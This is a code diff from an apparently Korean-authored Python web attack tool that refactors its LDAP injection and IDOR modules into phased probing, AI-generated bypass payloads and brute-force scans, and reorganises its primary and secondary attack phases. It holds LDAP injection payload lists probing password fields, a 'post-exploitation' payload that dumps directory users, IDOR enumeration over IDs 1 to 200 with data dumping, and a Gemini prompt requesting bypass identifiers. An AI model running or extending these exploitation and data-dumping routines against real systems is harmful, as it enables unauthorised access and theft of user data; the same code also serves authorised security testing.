-        *[f"(&(lastLogon>={ts})(lastLogon<={ts}))" for ts in ['131293440000000000']], # Timestamp based
-        *[f"*)(userPassword=*{p}*)" for p in ['pass', '123', 'secret', 'admin']],
-        *[f"*)(description=*{d}*)" for d in ['test', 'default', 'account']],
-        *[f"(&(uid={i})(objectClass=posixAccount))" for i in range(100, 200)],
-        *[f"(&(homeDirectory=*{d}*)(loginShell=*{s}*))" for d in ['/home', '/users'] for s in ['/bin/bash', '/bin/sh']],
     ]
 
     ldap_errors = [
@@ -4052,36 +3935,61 @@ async def check_ldap_injection(target, form_to_test, output, tech, report, sessi
         "ldap_search()", "ldap entry", "search filter is invalid"
     ]
 
-    async def test_ldap(url, method, param_name, original_value, form_data=None, original_query=None):
-        for p in ldap_payloads:
-            for encoded_p in get_encoded_payloads(p):
-                test_url, test_data = build_request(url, method, param_name, original_value + encoded_p, form_data, original_query)
-                res, request_details, response_details = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
+    async def test_single_ldap_payload(point, payload):
+        for encoded_p in get_encoded_payloads(payload):
+            test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + encoded_p, point['form_data'], point['original_query'])
+            res, request_details, response_details = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
 
-                if res and any(e in (await res.text()).lower() for e in ldap_errors):
-                    output.print(f"  [CRITICAL] Error-Based LDAP Injection confirmed in {method.upper()} param '{param_name}' with payload: {encoded_p}")
-                    evidence = f"Vulnerable URL: {test_url}\nPayload: {encoded_p}\n\n--- Response Snippet (Error Message) ---\n{(await res.text())[:400]}\n---"
-                    
-                    # Post-exploitation: try to dump all users
-                    dump_payload = "(&(objectClass=*)(uid=*))"
-                    dump_url, dump_data = build_request(url, method, param_name, original_value + dump_payload, form_data, original_query)
-                    res_dump, req_dump, resp_dump = await _send_async_http_request(dump_url, method=method, data=dump_data, output=output, session_cookies=session_cookies)
-                    if res_dump and not any(e in (await res_dump.text()).lower() for e in ldap_errors):
-                        evidence += f"\n\n--- Post-Exploitation (User Dump Attempt) ---\nPayload: {dump_payload}\nResponse Snippet:\n{(await res_dump.text())[:500]}\n---"
-                        output.print(f"    [SUCCESS] Post-exploitation payload sent. Response may contain user data.")
+            if res and await res.text() and any(e in (await res.text()).lower() for e in ldap_errors):
+                output.print(f"  [CRITICAL] Error-Based LDAP Injection confirmed in {point['method'].upper()} param '{point['param']}' with payload: {encoded_p}")
+                evidence = f"Vulnerable URL: {test_url}\nPayload: {encoded_p}\n\n--- Response Snippet (Error Message) ---\n{(await res.text())[:400]}\n---"
+                
+                dump_payload = "(&(objectClass=*)(uid=*))"
+                dump_url, dump_data = build_request(point['url'], point['method'], point['param'], point['value'] + dump_payload, point['form_data'], point['original_query'])
+                res_dump, _, _ = await _send_async_http_request(dump_url, method=point['method'], data=dump_data, output=output, session_cookies=session_cookies)
+                if res_dump and await res_dump.text() and not any(e in (await res_dump.text()).lower() for e in ldap_errors):
+                    evidence += f"\n\n--- Post-Exploitation (User Dump Attempt) ---\nPayload: {dump_payload}\nResponse Snippet:\n{(await res_dump.text())[:500]}\n---"
+                    output.print(f"    [SUCCESS] Post-exploitation payload sent. Response may contain user data.")
 
-                    report.add_finding("LDAP Injection", "Critical", url, param_name, encoded_p,
-                                       "The application is vulnerable to LDAP Injection. An attacker can manipulate LDAP queries to bypass authentication or disclose sensitive information.",
-                                       "Use parameterized LDAP queries or a safe LDAP query construction library. Strictly validate and sanitize all user input used in LDAP filters.",
-                                       evidence, method=method, request_details=request_details, response_details=response_details)
-                    return True
+                report.add_finding("LDAP Injection", "Critical", point['url'], point['param'], encoded_p,
+                                   "The application is vulnerable to LDAP Injection, allowing query manipulation.",
+                                   "Use parameterized LDAP queries or a safe query construction library. Sanitize all user input used in LDAP filters.",
+                                   evidence, method=point['method'], request_details=request_details, response_details=response_details)
+                return True
         return False
 
+    async def run_smart_probe(point):
+        output.print(f"  [Phase 1] Running Smart Probe for LDAP Injection on param '{point['param']}'...")
+        for payload in ldap_probes:
+            if await test_single_ldap_payload(point, payload):
+                return True
+        return False
+
+    async def run_ai_bypass(point):
+        output.print(f"  [Phase 2] Running AI-Assisted Bypass for LDAP Injection on param '{point['param']}'...")
+        probe_payload = "*)(cn=*"
+        test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + probe_payload, point['form_data'], point['original_query'])
+        res, _, _ = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+        response_snippet = (await res.text())[:500] if res and await res.text() else "No response from server."
+
+        ai_payloads = await ai_generate_dynamic_payloads("LDAP Injection", probe_payload, response_snippet, output)
+        for payload in ai_payloads:
+            if await test_single_ldap_payload(point, payload):
+                return True
+        return False
+
+    async def run_full_scan(point):
+        output.print(f"  [Phase 3] Smart probes failed. Starting Full Brute-Force Scan for LDAP Injection on param '{point['param']}'...")
+        for payload in ldap_payloads:
+            if await test_single_ldap_payload(point, payload):
+                return True
+        return False
+
+    # --- Main Orchestration Logic ---
     attack_points = []
     parsed_target = urlparse(target)
     base_url_without_query = f"{parsed_target.scheme}://{parsed_target.netloc}{parsed_target.path}"
 
-    # 1. Gather attack points from existing query parameters
     if parsed_target.query:
         params = unquote(parsed_target.query).split('&')
         for p_str in params:
@@ -4089,7 +3997,6 @@ async def check_ldap_injection(target, form_to_test, output, tech, report, sessi
             param_name, value = p_str.split('=', 1)
             attack_points.append({'url': target, 'method': 'get', 'param': param_name, 'value': value, 'form_data': None, 'original_query': parsed_target.query})
 
-    # 2. Gather attack points from existing form fields
     if form_to_test:
         action_url = urljoin(target, form_to_test['action'])
         form_data = {i['name']: i.get('value', 'test') for i in form_to_test['inputs']}
@@ -4099,21 +4006,29 @@ async def check_ldap_injection(target, form_to_test, output, tech, report, sessi
             original_value = input_field.get('value', 'test')
             attack_points.append({'url': action_url, 'method': form_to_test['method'], 'param': param_name, 'value': original_value, 'form_data': form_data, 'original_query': None})
 
-    # 3. Active Attack: Guess common parameter names
     if not attack_points:
-        output.print("  [*] No parameters found. Actively guessing common parameter names for LDAP Injection...")
         ldap_params = [p for p in COMMON_PARAM_NAMES if any(k in p for k in ['user', 'uid', 'name', 'search', 'filter', 'query', 'dn'])]
-        for param_name in ldap_params:
+        for param_name in ldap_params[:50]:
             attack_points.append({'url': base_url_without_query, 'method': 'get', 'param': param_name, 'value': 'test', 'form_data': None, 'original_query': None})
 
-    # 4. Execute attacks
     for point in attack_points:
         output.print(f"  [*] Testing LDAP Injection on {point['method'].upper()} parameter '{point['param']}' at {point['url']}")
-        if await test_ldap(point['url'], point['method'], point['param'], point['value'], point['form_data'], point['original_query']):
-            return # Vulnerability found, stop for this target
+        vulnerability_found = await run_smart_probe(point)
+        if vulnerability_found:
+            continue
 
-    output.print(f"  [INFO] No LDAP Injection detected for target {target} after all checks.")
-    report.add_check(f"LDAP Injection Check on {target}", "No vulnerability found")
+        if ai_enabled:
+            vulnerability_found = await run_ai_bypass(point)
+            if vulnerability_found:
+                continue
+        
+        vulnerability_found = await run_full_scan(point)
+        if vulnerability_found:
+            continue
+            
+        report.add_check(f"LDAP Injection on {point['param']}", "No vulnerability found")
+
+    output.print("  [INFO] LDAP Injection scan completed.")
 
 
 # --- 10. React2Shell ---
@@ -4440,7 +4355,7 @@ async def _exploit_idor_data_dump(original_url, param_name, initial_id, method, 
 # --- 12. IDOR ---
 
 async def check_idor(target, output, tech, report, session_cookies=None, discovered_urls=None, discovered_forms=None, ai_enabled=False):
-    output.print(f"\n[+] Starting Dynamic IDOR Scan on target: {target}...")
+    output.print(f"\n[+] Starting Hybrid IDOR Scan on target: {target}...")
     
     if discovered_urls is None: discovered_urls = []
     if discovered_forms is None: discovered_forms = []
@@ -4448,20 +4363,22 @@ async def check_idor(target, output, tech, report, session_cookies=None, discove
     potential_idor_points = []
     # From URLs
     for url in discovered_urls:
-        for match in list(re.finditer(r'(\d+)', url)):
+        # Find all numeric sequences in the URL
+        for match in re.finditer(r'(\d+)', url):
             try:
                 potential_idor_points.append({
                     'type': 'url', 'original_url': url, 'id_str': match.group(1), 'id_int': int(match.group(1)),
-                    'param_name': 'ID in URL Path/Query'
+                    'param_name': f"ID in URL ({match.group(1)})"
                 })
             except ValueError: continue
     # From Forms
     for form in discovered_forms:
         action_url = urljoin(target, form['action'])
         for i in form['inputs']:
-            if i.get('name') and (re.search(r'id|num|no|idx', i['name'], re.I) or re.search(r'^\d+$', str(i.get('value', '')))):
+            # Check for common ID-like names or numeric values
+            if i.get('name') and (re.search(r'id|num|no|idx', i['name'], re.I) or (i.get('value') and str(i.get('value')).isdigit())):
                 original_id_str = str(i.get('value', '1'))
-                if re.match(r'^\d+$', original_id_str):
+                if original_id_str.isdigit():
                     try:
                         potential_idor_points.append({
                             'type': 'form', 'original_url': action_url, 'method': form['method'],
@@ -4476,72 +4393,81 @@ async def check_idor(target, output, tech, report, session_cookies=None, discove
         return
 
     tested_combinations = set()
-    for point in potential_idor_points:
-        original_id = point['id_int']
-        
-        found_idor = False
-        idor_evidence = []
 
-        # --- Phase 1: Numeric Probing ---
-        output.print(f"  [*] Probing for numeric IDOR on param '{point['param_name']}'...")
+    async def run_smart_probe(point):
+        output.print(f"  [Phase 1] Running Smart Probe for IDOR on param '{point['param_name']}' (Original ID: {point['id_str']})...")
+        original_id = point['id_int']
+        # Test neighbors and common low-privilege IDs
         numeric_probes = {original_id + offset for offset in [-2, -1, 1, 2] if original_id + offset >= 0}
-        numeric_probes.update({0, 1, 100, 1000})
+        numeric_probes.update({1, 2, 3})
         numeric_probes.discard(original_id)
         
         for test_id in sorted(list(numeric_probes)):
             found, vul_url, vul_param, vul_id, vul_method, vul_form_data = await _perform_idor_test(str(test_id), point, tested_combinations, output, report, session_cookies)
             if found:
-                found_idor = True
-                # Perform data dump
                 dumped_data = await _exploit_idor_data_dump(vul_url, vul_param, vul_id, vul_method, vul_form_data, output, session_cookies)
                 if dumped_data:
-                    idor_evidence.append("\n--- Enumerated Data via IDOR ---")
-                    idor_evidence.append(dumped_data)
-                
-                # Update the existing finding with the dumped data
-                for finding in report.findings:
-                    if finding['vulnerability'] == "Insecure Direct Object Reference (IDOR)" and finding['url'] == vul_url and finding['parameter'] == vul_param:
-                        finding['evidence'] += "\n" + "\n".join(idor_evidence)
-                        break
-                return # Vulnerability found and exploited, exit the entire function
+                    for finding in report.findings:
+                        if finding['vulnerability'] == "Insecure Direct Object Reference (IDOR)" and finding['payload'] == vul_id:
+                            finding['evidence'] += "\n\n--- Enumerated Data via IDOR ---\n" + dumped_data
+                            break
+                return True
+        return False
 
-        # --- Phase 2: AI-Powered ID Suggestion ---
-        if ai_enabled and not found_idor:
-            output.print(f"  [AI MODE] Numeric IDOR probe failed. Analyzing '{point['param_name']}' for complex IDOR patterns...")
-            try:
-                prompt = f"""
-                As a security expert, I am testing for IDOR. I found a parameter named '{point['param_name']}' in the URL: {point['original_url']} with a numeric value '{point['id_str']}'.
-                Besides simple numbers, what are 5-10 other common or creative non-numeric identifiers I should test for this parameter?
-                Consider patterns like common usernames (admin, guest), roles, UUIDs, or encoded values.
-                Provide only the raw suggested identifiers, each on a new line.
-                """
-                response = await GEMINI_MODEL.generate_content_async(prompt)
-                ai_suggestions = [p.strip() for p in response.text.split('\n') if p.strip()]
-                
-                if ai_suggestions:
-                    output.print(f"    [AI INFO] Generated {len(ai_suggestions)} new ID patterns to test.")
-                    for test_id_str in ai_suggestions:
-                        found, vul_url, vul_param, vul_id, vul_method, vul_form_data = await _perform_idor_test(test_id_str, point, tested_combinations, output, report, session_cookies)
-                        if found:
-                            found_idor = True
-                            # Perform data dump
-                            dumped_data = await _exploit_idor_data_dump(vul_url, vul_param, vul_id, vul_method, vul_form_data, output, session_cookies)
-                            if dumped_data:
-                                idor_evidence.append("\n--- Enumerated Data via IDOR ---")
-                                idor_evidence.append(dumped_data)
-                            
-                            # Update the existing finding with the dumped data
-                            for finding in report.findings:
-                                if finding['vulnerability'] == "Insecure Direct Object Reference (IDOR)" and finding['url'] == vul_url and finding['parameter'] == vul_param:
-                                    finding['evidence'] += "\n" + "\n".join(idor_evidence)
-                                    break
-                            return # Found one, no need to test more AI suggestions for this point
-            except Exception as e:
-                output.print(f"    [AI ERROR] Failed to get IDOR suggestions: {e}")
+    async def run_ai_bypass(point):
+        output.print(f"  [Phase 2] Running AI-Assisted Bypass for IDOR on param '{point['param_name']}'...")
+        try:
+            prompt = f"""
+            As a security expert testing for IDOR on parameter '{point['param_name']}' in URL '{point['original_url']}', I've had no luck with simple numeric IDs. 
+            Suggest 5-10 creative, non-numeric identifiers to test.
+            Include common patterns like 'admin', 'guest', roles, UUIDs (e.g., 00000000-0000-0000-0000-000000000001), or encoded values.
+            Provide only the raw suggested identifiers, each on a new line.
+            """
+            response = await GEMINI_MODEL.generate_content_async(prompt)
+            ai_suggestions = [p.strip() for p in response.text.split('\n') if p.strip()]
+            
+            if ai_suggestions:
+                output.print(f"    [AI INFO] Generated {len(ai_suggestions)} new ID patterns to test.")
+                for test_id_str in ai_suggestions:
+                    found, vul_url, vul_param, vul_id, vul_method, vul_form_data = await _perform_idor_test(test_id_str, point, tested_combinations, output, report, session_cookies)
+                    if found:
+                        return True
+        except Exception as e:
+            output.print(f"    [AI ERROR] Failed to get IDOR suggestions: {e}")
+        return False
+
+    async def run_full_scan(point):
+        output.print(f"  [Phase 3] Smart probes failed. Starting Full Scan for IDOR on param '{point['param_name']}' (1-200)...")
+        for test_id in range(1, 201):
+            if test_id == point['id_int']: continue
+            found, vul_url, vul_param, vul_id, vul_method, vul_form_data = await _perform_idor_test(str(test_id), point, tested_combinations, output, report, session_cookies)
+            if found:
+                # Only run expensive data dump if we find something in the full scan
+                dumped_data = await _exploit_idor_data_dump(vul_url, vul_param, vul_id, vul_method, vul_form_data, output, session_cookies)
+                if dumped_data:
+                     for finding in report.findings:
+                        if finding['vulnerability'] == "Insecure Direct Object Reference (IDOR)" and finding['payload'] == vul_id:
+                            finding['evidence'] += "\n\n--- Enumerated Data via IDOR ---\n" + dumped_data
+                            break
+                return True # Stop after first find in full scan to avoid excessive requests
+        return False
+
+    # --- Main Orchestration Logic ---
+    for point in potential_idor_points:
+        vulnerability_found = await run_smart_probe(point)
+        if vulnerability_found:
+            continue
+
+        if ai_enabled:
+            vulnerability_found = await run_ai_bypass(point)
+            if vulnerability_found:
+                continue
         
-        if not found_idor:
-            output.print(f"  [INFO] No IDOR detected for param '{point['param_name']}' at {point['original_url']} after all checks.")
-            report.add_check(f"IDOR Check on {point['param_name']}", "No vulnerability found")
+        vulnerability_found = await run_full_scan(point)
+        if vulnerability_found:
+            continue
+
+        report.add_check(f"IDOR Check on {point['param_name']}", "No vulnerability found")
     
     output.print("  [INFO] IDOR scan completed.")
 
@@ -6265,16 +6191,20 @@ async def run_attack_sequence(target, session_cookies, output_handler, ai_enable
     if ai_enabled:
         output_handler.print("\n[AI MODE] AI assistance is enabled for this scan.")
 
-    # run_all_attacks will now handle the phased attack and user prompt
-    await run_all_attacks(target, output_handler, tech, report, session_cookies=session_cookies, ai_enabled=ai_enabled)
+    # run_all_attacks will now return True if the secondary scan was run, False otherwise.
+    secondary_scan_was_run = await run_all_attacks(target, output_handler, tech, report, session_cookies=session_cookies, ai_enabled=ai_enabled)
     
-    report_filename = f"report_{get_domain(target)}_{time.strftime('%Y%m%d_%H%M%S')}.txt"
-    ai_content = ""
-    if ai_enabled:
-        ai_content = await ai_generate_report_summary(report, output_handler)
-    
-    report.write_to_file(report_filename, append_content=ai_content)
-    output_handler.print(f"\n[SUCCESS] Report generated: {report_filename}")
+    # Only generate the final, comprehensive report if the secondary scan was executed.
+    if secondary_scan_was_run:
+        report_filename = f"report_final_{get_domain(target)}_{time.strftime('%Y%m%d_%H%M%S')}.txt"
+        ai_content = ""
+        if ai_enabled:
+            ai_content = await ai_generate_report_summary(report, output_handler)
+        
+        report.write_to_file(report_filename, append_content=ai_content)
+        output_handler.print(f"\n[SUCCESS] Final comprehensive report generated: {report_filename}")
+    else:
+        output_handler.print(f"\n[INFO] Scan finished. Primary report has been saved.")
 
 def _run_single_attack(args):
     """Helper function to run a single attack; designed to be called by ThreadPoolExecutor."""
@@ -6380,33 +6310,26 @@ async def run_all_attacks(target, output_handler, tech, report, session_cookies=
         scan_react2shell, check_xxe, check_csrf, check_file_inclusion, brute_force_login
     ]
 
-    # Create a mapping from function name string to function object
     attack_func_map = {func.__name__: func for func in all_possible_attacks}
 
-    # Reorder attacks based on AI recommendations
     if recommended_attacks:
         output_handler.print(f"\n[AI MODE] Reordering attacks based on AI recommendations: {', '.join(recommended_attacks)}")
         prioritized_attacks = []
         seen_attacks = set()
-
-        # Add recommended attacks first
         for rec_name in recommended_attacks:
             if rec_name in attack_func_map and rec_name not in seen_attacks:
                 prioritized_attacks.append(attack_func_map[rec_name])
                 seen_attacks.add(rec_name)
-        
-        # Add remaining attacks
         for attack_func in all_possible_attacks:
             if attack_func.__name__ not in seen_attacks:
                 prioritized_attacks.append(attack_func)
-        
-        primary_attacks = prioritized_attacks[:6] # Keep the first 6 as primary
+        primary_attacks = prioritized_attacks[:6]
         secondary_attacks = prioritized_attacks[6:]
     else:
         primary_attacks = [
             check_sql_injection, check_xss, check_command_injection,
             check_idor, check_http_smuggling, check_ldap_injection,
-            scan_exposed_services # NEW: Added basic service scan
+            scan_exposed_services
         ]
         secondary_attacks = [
             scan_and_exploit_mongodb, scan_rtsp, check_insecure_deserialization,
@@ -6418,14 +6341,11 @@ async def run_all_attacks(target, output_handler, tech, report, session_cookies=
     for form in discovered_forms:
         all_targets.add(form['action'])
 
-    # Shared state for progress tracking
     completed_tasks_counter = {'count': 0, 'lock': threading.Lock()}
-    
-    # This will be adjusted later if secondary scan is confirmed
     total_tasks = [len(all_targets) * len(primary_attacks)]
 
     def execute_attack_phase(phase_name, attack_definitions):
-        global attack_progress # Moved to the top of the function
+        global attack_progress
         output_handler.print("\n" + "="*50)
         output_handler.print(f"  {phase_name} (Running with {num_threads} threads)")
         output_handler.print("="*50)
@@ -6444,29 +6364,25 @@ async def run_all_attacks(target, output_handler, tech, report, session_cookies=
         with ThreadPoolExecutor(max_workers=num_threads) as executor:
             future_to_task = {executor.submit(_run_single_attack, task): task for task in tasks}
             
-            # Use tqdm for a more visible progress bar in terminal mode
             if isinstance(output_handler, TerminalOutput):
-                # Create a custom tqdm instance to control its output and ensure it doesn't interfere with other prints
                 with tqdm(total=len(tasks), desc=f"{phase_name} Progress", unit="task", dynamic_ncols=True, position=0, leave=True) as pbar:
                     for future in as_completed(future_to_task):
                         with completed_tasks_counter['lock']:
                             completed_tasks_counter['count'] += 1
                             if total_tasks[0] > 0:
                                 attack_progress = (completed_tasks_counter['count'] / total_tasks[0]) * 100
-                        
                         try:
                             future.result()
                         except Exception as exc:
                             output_handler.print(f'\n[ERROR] A task in {phase_name} generated an exception: {exc}')
                         finally:
-                            pbar.update(1) # Update the progress bar for each completed task
-            else: # For QueueOutputHandler (Web UI), just iterate without tqdm
+                            pbar.update(1)
+            else:
                 for future in as_completed(future_to_task):
                     with completed_tasks_counter['lock']:
                         completed_tasks_counter['count'] += 1
                         if total_tasks[0] > 0:
                             attack_progress = (completed_tasks_counter['count'] / total_tasks[0]) * 100
-                    
                     try:
                         future.result()
                     except Exception as exc:
@@ -6476,26 +6392,28 @@ async def run_all_attacks(target, output_handler, tech, report, session_cookies=
     execute_attack_phase("PHASE 2.1: PRIMARY ATTACK", primary_attacks)
     output_handler.print("\n[INFO] Primary attack phase completed.")
 
+    # --- NEW: Generate Interim Report for Primary Phase ---
+    interim_report_filename = f"report_primary_{get_domain(target)}_{time.strftime('%Y%m%d_%H%M%S')}.txt"
+    output_handler.print(f"\n[INFO] Generating primary phase report: {interim_report_filename}")
+    report.write_to_file(interim_report_filename)
+
     continue_scan = 'y'
     if isinstance(output_handler, TerminalOutput):
         try:
             continue_scan = input("  [?] Continue with all secondary attack modules? (Y/N): ").lower()
         except (EOFError, KeyboardInterrupt):
             continue_scan = 'n'
-            output_handler.print("\n[INFO] Scan interrupted by user. Proceeding to report generation.")
+            output_handler.print("\n[INFO] Scan interrupted by user.")
     
     if continue_scan == 'y':
         total_tasks[0] += len(all_targets) * len(secondary_attacks)
         execute_attack_phase("PHASE 2.2: SECONDARY ATTACK", secondary_attacks)
+        output_handler.print("\n[INFO] Secondary attack phase completed.")
+        return True # Indicate that secondary scan was run
     else:
         if isinstance(output_handler, TerminalOutput):
-            output_handler.print("\n[INFO] Skipping secondary attack modules. Finalizing report.")
-
-    global attack_progress
-    attack_progress = 100
-    output_handler.print("\n" + "="*50)
-    output_handler.print("  ALL SCAN SEQUENCES COMPLETED.")
-    output_handler.print("="*50)
+            output_handler.print("\n[INFO] Skipping secondary attack modules.")
+        return False # Indicate that secondary scan was skipped
 # =================================================================================
 # 6. Flask 라우트 및 메인 실행 (v5.5 Ultimate Pro Max)
 # =================================================================================
